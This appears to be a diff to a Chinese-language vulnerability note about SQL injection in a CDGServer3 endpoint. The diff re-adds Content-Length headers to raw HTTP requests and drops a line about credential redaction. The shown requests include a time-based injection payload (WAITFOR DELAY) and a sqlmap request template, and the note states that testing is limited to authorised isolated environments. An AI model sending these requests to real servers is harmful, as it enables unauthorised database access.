@@ -43,7 +43,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -71,11 +71,12 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 98
 
 path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
 ```
 
-> 请求长度说明：原资料 Content-Length 为 98；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 98；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 ```java
@@ -89,6 +90,7 @@ POST /CDGServer3/user/updateUserToOrganise.jsp;Service HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
 Connection: close
+Content-Length: 33
 Content-Type: application/x-www-form-urlencoded
 Cookie: JSESSIONID=719804E36DC9165F889264FEFC9C60C3; Path=/CDGServer3; HttpOnly
 Accept-Encoding: gzip
@@ -96,7 +98,7 @@ Accept-Encoding: gzip
 userId=1';WAITFOR DELAY '0:0:1'--
 ```
 
-> 请求长度说明：原资料 Content-Length 为 33；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 33；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 3. sqlmap
@@ -106,6 +108,7 @@ POST /CDGServer3/user/updateUserToOrganise.jsp;Service HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
 Connection: close
+Content-Length: 33
 Content-Type: application/x-www-form-urlencoded
 Cookie: JSESSIONID=719804E36DC9165F889264FEFC9C60C3; Path=/CDGServer3; HttpOnly
 Accept-Encoding: gzip
@@ -113,7 +116,7 @@ Accept-Encoding: gzip
 userId=1
 ```
 
-> 请求长度说明：原资料 Content-Length 为 33；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 33；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 > 原文: <https://www.yuque.com/xiaokp7/ocvun2/cfx26o5cmkgld0ga>
